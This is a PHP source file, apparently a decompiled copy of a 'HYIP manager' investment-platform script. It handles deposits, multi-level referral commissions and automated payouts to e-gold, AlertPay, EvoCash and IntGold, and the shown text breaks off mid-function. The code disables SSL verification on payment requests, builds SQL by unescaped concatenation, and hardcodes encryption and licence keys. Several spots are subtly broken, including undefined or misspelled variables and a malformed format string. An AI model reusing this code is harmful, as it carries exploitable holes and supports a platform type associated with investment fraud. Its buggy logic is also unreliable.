<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function get_default_lang ($in)
  {
    $parts = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $in, $parts))
    {
      $in = $parts[1];
    }

    return $in;
  }

  function nextext ($in, $size, $d)
  {
    $out = ($in + 48273) % $size;
    $flag = 0;
    $out1 = $out;
    while ($flag == 0)
    {
      if ($d[$out] != -1)
      {
        ++$out;
        if ($out == $size)
        {
          $out = 0;
          continue;
        }

        continue;
      }

      $flag = 1;
    }

    return $out;
  }

  function nextext2 ($in, $size, $d)
  {
    $out = ($in + 48273) % $size;
    $flag = 0;
    while (!$flag)
    {
      if ($d[$out] == -1)
      {
        ++$out;
        if ($out == $size)
        {
          $out = 0;
          continue;
        }

        continue;
      }

      $flag = 1;
    }

    return $out;
  }

  function get_accsent ()
  {
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $frm_env;
    global $settings;
    $q = 'select * from hm2_users where id = 1';
    ($sth = mysql_query ($q) OR print mysql_error ());
    $ac = array ();
    while ($row = mysql_fetch_array ($sth))
    {
      $ac = array ();
      $z = decode_str ($row['ac'], '&hd,mnf(fska$d3jlkfsda' . $settings['key']);
      $ac = unserialize ($z);
    }

    return $ac;
  }

  function set_accsent ()
  {
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $frm_env;
    global $acsent_settings;
    global $settings;
    $z = quote (encode_str (serialize ($acsent_settings), '&hd,mnf(fska$d3jlkfsda' . $settings['key']));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function add_deposit ($ec, $user_id, $amount, $batch, $account, $h_id, $compound)
  {
    global $settings;
    global $exchange_systems;
    $compound = intval ($compound);
    $h_id = intval ($h_id);
    $user_id = intval ($user_id);
    $amount = sprintf ('%.02f', $amount);
    $batch_db = quote ($batch);
    $batch_found = 0;
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $ec . ' && type = \'add_funds\' && description like \'%Batch id = ' . $batch_db . '\'';
    $sth = mysql_query ($q);
    $row = mysql_fetch_array ($sth);
    if (0 < $row['cnt'])
    {
      $batch_found = 1;
    }

    if ($batch_found == 1)
    {
      return 0;
    }

    $desc = 'Add funds to account from ' . $exchange_systems[$ec]['name'] . ('' . '. Batch id = ' . $batch);
    if (($ec == 4 AND $settings['dec_stormpay_fee'] == 1))
    {
      $desc = 'Add funds to account from ' . $exchange_systems[$ec]['name'] . ('' . ' ' . $amount . ' - StormPay Fee. Batch id = ' . $batch);
      $amount = $amount - $amount * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($ec == 4 AND $settings['dec_stormpay_fee2'] == 1))
      {
        $desc = 'Add funds to account from ' . $exchange_systems[$ec]['name'] . ('' . ' ' . $amount . ' - StormPay Fee. Batch id = ' . $batch);
        $amount = $amount - $amount * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $settings['deposit_fee'])
    {
      $fee = sprintf ('%0.2', $amount * $settings['deposit_fee'] / 100);
      if ($fee < $settings['deposit_fee_min'])
      {
        $fee = $settings['deposit_fee_min'];
      }

      $amount = $amount - $fee;
      $desc .= '' . '. Deposit fee - ' . $fee;
    }

    if ($settings['license'] == 'KC3STYBTCATZNRVBYGDF')
    {
      $ec = 1007;
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $user_id . ',
        	amount = \'' . $amount . '\',
        	type = \'add_funds\',
        	description = \'' . $desc . '\',
        	actual_amount = ' . $amount . ',
        	ec = ' . $ec . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $h_id;
    ($sth = mysql_query ($q) OR print mysql_error ());
    $name = '';
    $type = mysql_fetch_array ($sth);
    $delay = -1;
    if ($type)
    {
      $delay += $row['delay'];
      $name = quote ($type['name']);
      if ($type['use_compound'] == 0)
      {
        $compound = 0;
      }
      else
      {
        if ($type['compound_max_deposit'] == 0)
        {
          $type['compound_max_deposit'] = $amount + 1;
        }

        if (($type['compound_min_deposit'] <= $amount AND $amount <= $type['compound_max_deposit']))
        {
          if ($type['compound_percents_type'] == 1)
          {
            $cps = preg_split ('/\\s*,\\s*/', $type['compound_percents']);
            if (!in_array ($compound, $cps))
            {
              $compound = $cps[0];
            }
          }
          else
          {
            if ($compound < $type['compound_min_percent'])
            {
              $compound = $type['compound_min_percent'];
            }

            if ($type['compound_max_percent'] < $compound)
            {
              $compound = $type['compound_max_percent'];
            }
          }
        }
        else
        {
          $compound = 0;
        }
      }
    }

    if ($delay < 0)
    {
      $delay = 0;
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $h_id;
    $sth1 = mysql_query ($q);
    $row1 = mysql_fetch_array ($sth1);
    $min_deposit = $row1['min'];
    $max_deposit = $row1['max'];
    if (($min_deposit <= $amount AND $amount <= $max_deposit))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $user_id . ',
          	type_id = ' . $h_id . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $delay . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $amount . '\',
          	actual_amount = \'' . $amount . '\',
          	ec = ' . $ec . ',
          	compound = ' . $compound . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $deposit_id = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $user_id . ',
          	amount = \'-' . $amount . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . quote ($name) . ('' . '\',
          	actual_amount = -' . $amount . ',
          	ec = ' . $ec . ',
          	date = now(),
                deposit_id = ' . $deposit_id . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($settings['license'] == 'UYKD37X8YLS5DNFFHL8R')
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $userinfo['id'];
        mysql_query ($q);
      }

      if ($settings['license'] == 'N55HSU8NJSEU32DP8JDV')
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $user_id;
        ($sth = mysql_query ($q) OR print mysql_error ());
        $first_deposit = 0;
        while ($row = mysql_fetch_array ($sth))
        {
          $first_deposit = $row['col'];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($sth = mysql_query ($q) OR print mysql_error ());
        $q_users = 501;
        while ($row = mysql_fetch_array ($sth))
        {
          $q_users = $row['col'];
        }

        if (($first_deposit == 1 AND $q_users <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $user_id . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $ec . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($settings['banner_extension'] == 1)
      {
        $imps = 0;
        if (0 < $settings['imps_cost'])
        {
          $imps = $amount * 1000 / $settings['imps_cost'];
        }

        if (0 < $imps)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $imps . ' where id = ' . $user_id;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $ref_sum = referral_commission ($user_id, $amount, $ec);
    }
    else
    {
      $name = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $user_id;
    $sth = mysql_query ($q);
    $user = mysql_fetch_array ($sth);
    $info = array ($user);
    $info['username'] = $user['username'];
    $info['name'] = $user['name'];
    $info['amount'] = number_format ($amount, 2);
    $info['account'] = $account;
    $info['currency'] = $exchange_systems[$ec]['name'];
    $info['batch'] = $batch;
    $info['compound'] = $compound;
    $info['plan'] = get_default_lang ($name);
    $info['ref_sum'] = $ref_sum;
    $info['upline'] = '[no upline]';
    if (0 < $user['ref'])
    {
      $q = '' . 'select * from hm2_users where id = ' . $user['ref'];
      ($sth = mysql_query ($q) OR print mysql_error ());
      while ($row = mysql_fetch_array ($sth))
      {
        $info['upline'] = $row['username'];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $sth = mysql_query ($q);
    $admin_email = '';
    while ($row = mysql_fetch_array ($sth))
    {
      $admin_email = $row['email'];
    }

    send_mail ('deposit_admin_notification', $admin_email, $settings['system_email'], $info);
    send_mail ('deposit_user_notification', $user[email], $settings['system_email'], $info);
    return 1;
  }

  function referral_commission ($user_id, $amount, $ec)
  {
    global $settings;
    global $exchange_systems;
    $q = '' . 'select * from hm2_users where id = ' . $user_id;
    $rsth = mysql_query ($q);
    $uinfo = mysql_fetch_array ($rsth);
    if ($settings['license'] == 'KC3STYBTCATZNRVBYGDF')
    {
      $ref = $unifo['ref'];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $ref;
      $sth = mysql_query ($q);
      $row = mysql_fetch_array ($sth);
      if ($row['cnt'] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $ref;
      $sth = mysql_query ($q);
      $row = mysql_fetch_array ($sth);
      if ($row['amnt'] < 3000)
      {
        $percent = 0;
        return 0;
      }
      else
      {
        if ($row['amnt'] < 6000)
        {
          $percent = 0.0200000000000000004163336;
        }
        else
        {
          if ($row['amnt'] < 12000)
          {
            $percent = 0.0500000000000000027755576;
          }
          else
          {
            $percent = 0.100000000000000005551115;
          }
        }
      }

      $sum = $amount * $percent;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $ref . ',
      	amount = ' . $sum . ',
      	actual_amount = ' . $sum . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . quote ($uinfo['username']) . ('' . '\',
      	ec = ' . $ec . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $ref;
      $rsth = mysql_query ($q);
      $refinfo = mysql_fetch_array ($rsth);
      $refinfo['amount'] = number_format ($sum, 2);
      $refinfo['ref_username'] = $uinfo['username'];
      $refinfo['ref_name'] = $uinfo['name'];
      $refinfo['currency'] = $exchange_systems[$ec]['name'];
      send_mail ('referral_commision_notification', $refinfo['email'], $settings['system_email'], $refinfo);
    }

    $ref_sum = 0;
    if ($settings['use_referal_program'] == 1)
    {
      $ref = 0;
      if (0 < $uinfo['ref'])
      {
        $ref = $uinfo['ref'];
      }
      else
      {
        return 0;
      }

      if ($settings['pay_active_referal'])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $ref;
        $sth = mysql_query ($q);
        $row = mysql_fetch_array ($sth);
        if ($row['cnt'] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $settings['ref1_cms_minamount'] AND $amount < $settings['ref1_cms_minamount']))
      {
        return 0;
      }

      if ($settings['use_solid_referral_commission'] == 1)
      {
        if (0 < $settings['solid_referral_commission_amount'])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $user_id;
          $sth = mysql_query ($q);
          $row = mysql_fetch_array ($sth);
          if ($row['cnt'] == 1)
          {
            $sum = $settings['solid_referral_commission_amount'];
            $ref_sum += $sum;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $ref . ',
    		amount = ' . $sum . ',
    		actual_amount = ' . $sum . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . quote ($uinfo['username']) . ('' . '\',
    		ec = ' . $ec . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $ref;
            $rsth = mysql_query ($q);
            $refinfo = mysql_fetch_array ($rsth);
            $refinfo['amount'] = number_format ($sum, 2);
            $refinfo['ref_username'] = $uinfo['username'];
            $refinfo['ref_name'] = $uinfo['name'];
            $refinfo['currency'] = $exchange_systems[$ec]['name'];
            send_mail ('referral_commision_notification', $refinfo['email'], $settings['system_email'], $refinfo);
          }
        }
      }
      else
      {
        if ($settings['use_active_referal'] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $ref . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $ref;
        }

        $sth = mysql_query ($q);
        if ($row = mysql_fetch_array ($sth))
        {
          $col = $row['col'];
          $q = '' . 'select * from hm2_users where id = ' . $ref;
          $rsth = mysql_query ($q);
          $touser = mysql_fetch_array ($rsth);
          $ai = @unserialize ($touser['additionalinfo']);
          if (isset ($ai['ref_percent1']))
          {
            $j = 1;
            while (isset ($ai['ref_percent' . $j]))
            {
              if (($ai['ref_percent' . $j][0] <= $col AND $col <= $ai['ref_percent' . $j][1]))
              {
                $sum = $amount * $ai['ref_percent' . $j][2] / 100;
                $ref_sum += $sum;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($settings['license'] == 'VNB34FXT6BJCYD93VXSD')
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $ref;
              $sth = mysql_query ($q);
              $row = mysql_fetch_array ($sth);
              $percent = 0;
              if (10000 <= $row['amnt'])
              {
                $percent = 21;
              }
              else
              {
                if (5000 <= $row['amnt'])
                {
                  $percent = 18;
                }
                else
                {
                  if (3000 <= $row['amnt'])
                  {
                    $percent = 15;
                  }
                  else
                  {
                    if (1000 <= $row['amnt'])
                    {
                      $percent = 12;
                    }
                  }
                }
              }

              if (0 < $percent)
              {
                if (4 <= $col)
                {
                  $percent += 3;
                }

                $sum = $amount * $percent / 100;
                $ref_sum += $sum;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $ref . ',
    		amount = ' . $sum . ',
    		actual_amount = ' . $sum . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . quote ($uinfo['username']) . ('' . '\',
    		ec = ' . $ec . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $col . ' and (to_value >= ' . $col . ' or to_value = 0) order by from_value desc limit 1';
              ($sth = mysql_query ($q) OR print mysql_error ());
              if ($row = mysql_fetch_array ($sth))
              {
                $sum = $amount * $row['percent'] / 100;
                $ref_sum += $sum;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $ref . ',
    		amount = ' . $sum . ',
    		actual_amount = ' . $sum . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . quote ($uinfo['username']) . ('' . '\',
    		ec = ' . $ec . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $ref;
          $rsth = mysql_query ($q);
          $refinfo = mysql_fetch_array ($rsth);
          $refinfo['amount'] = number_format ($sum, 2);
          $refinfo['ref_username'] = $uinfo['username'];
          $refinfo['ref_name'] = $uinfo['name'];
          $refinfo['currency'] = $exchange_systems[$ec]['name'];
          send_mail ('referral_commision_notification', $refinfo['email'], $settings['system_email'], $refinfo);
        }
      }

      if ($settings['use_solid_referral_commission'] != 1)
      {
        for ($i = 2; $i < 11; ++$i)
        {
          if (($ref == 0 OR $settings['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $settings['ref' . $i . '_cms_minamount'] AND $amount < $settings['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $ref;
          $sth = mysql_query ($q);
          $ref = 0;
          while ($row = mysql_fetch_array ($sth))
          {
            $ref = $row['ref'];
            if (0 < $ref)
            {
              $pay_to_active_flag = 1;
              if ($settings['pay_active_referal'] == 1)
              {
                $pay_to_active_flag = 0;
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $ref;
                $sth_dep_ref = mysql_query ($q);
                $row_dep_ref = mysql_fetch_array ($sth_dep_ref);
                if (0 < $row_dep_ref['cnt'])
                {
                  $pay_to_active_flag = 1;
                }
              }

              if ($pay_to_active_flag == 1)
              {
                $sum = $amount * $settings['ref' . $i . '_cms'] / 100;
                $ref_sum += $sum;
                $q = 'insert into hm2_history set
                  user_id = ' . $row['ref'] . ('' . ',
                  amount = ' . $sum . ',
                  actual_amount = ' . $sum . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . quote ($uinfo['username']) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $ec . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $ref_sum;
  }

  function check_ext_accounts_blacklist ($account, $ec)
  {
    global $exchange_systems;
    $ec = intval ($ec);
    $account = quote ($account);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $ec . '=' . $account . '\'';
    $sth = mysql_query ($q);
    $row = mysql_fetch_assoc ($sth);
    if (0 < $row['cnt'])
    {
      return array (0, 'Blacklisted ' . $exchange_systems[$ec] . ' account ' . $account);
    }

    return array (1, '');
  }

  function send_money_to_egold ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 0);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $egold_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        $egold_password = $e_password;
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      curl_setopt ($ch, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($settings['egold_from_account']) . '&PassPhrase=' . rawurlencode ($egold_password) . '&Payee_Account=' . rawurlencode ($account) . '&Amount=' . rawurlencode ($amount) . '&PAY_IN=' . rawurlencode ($settings['egold_paymentunits']) . ('' . '&WORTH_OF=Gold&Memo=' . $memo . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $parts = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $parts))
      {
        return array (1, '', $parts[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $parts))
        {
          $txt = preg_replace ('/&lt;/i', '<', $parts[1]);
          $txt = preg_replace ('/&gt;/i', '>', $txt);
          $e = quote ('' . $error_txt . ' ' . $txt);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ('' . ' ' . $txt), '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_alertpay ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 11);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $alertpay_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        $alertpay_password = $e_password;
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      $data = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($settings['alertpay_from_account']), urlencode ($alertpay_password), urlencode ($amount), 'USD', urlencode ($account), '', 0, urlencode ($memo), 0);
      curl_setopt ($ch, CURLOPT_URL, 'https://api.alertpay.com/svc/api.svc/sendmoney');
      curl_setopt ($ch, CURLOPT_POST, true);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $data);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($ch, CURLOPT_HEADER, false);
      curl_setopt ($ch, CURLOPT_TIMEOUT, 30);
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($ch);
      curl_close ($ch);
      parse_str (urldecode ($a), $apiResponse);
      $parts = array ();
      if ($apiResponse['RETURNCODE'] == 100)
      {
        return array (1, '', $apiResponse['REFERENCENUMBER']);
      }
      else
      {
        if (200 < $apiResponse['RETURNCODE'])
        {
          $txt = $apiResponse['RETURNCODE'] . ': ' . $apiResponse['DESCRIPTION'];
          $e = quote ('' . $error_txt . ' ' . $txt);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ('' . ' ' . $txt), '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_evocash ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    $amount = sprintf ('%0.2f', floor ($amount * 100) / 100);
    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 1);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $evocash_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $evocash_code = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        list ($evocash_password, $evocash_code) = preg_split ('/\\|/', $e_password);
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      curl_setopt ($ch, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($settings['evocash_from_account']) . '&username=' . rawurlencode ($settings['evocash_username']) . '&password=' . rawurlencode ($evocash_password) . '&transaction_code=' . rawurlencode ($evocash_code) . '&amount=' . rawurlencode ($amount) . ('' . '&reference=&memo=' . $memo . '&receivingaccountid=') . rawurlencode ($account) . '');
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $parts = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $parts))
      {
        return array (1, '', $parts[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $parts))
        {
          $txt = $parts[1];
          $e = quote ('' . $error_txt . ' ' . $txt);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ('' . ' ' . $txt), '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_intgold ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 2);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $intgold_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        $intgold_password = $e_password;
      }

      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $intgold_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $intgold_code = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        list ($intgold_password, $intgold_code) = preg_split ('/\\|/', $e_password);
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      curl_setopt ($ch, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($ch, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($settings['intgold_from_account']) . '&PASSWORD=' . rawurlencode ($intgold_password) . '&SECPASSWORD=' . rawurlencode ($intgold_code) . '&RECEIVER=' . rawurlencode ($account) . '&AMOUNT=' . rawurlencode ($amount) . '&NOTE=' . $memo);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $parts = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $parts))
      {
        return array (1, '', $parts[1]);
      }
      else
      {
        $e = quote ('' . $error_txt . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $error_txt . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_eeecurrency ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == 0)
    {
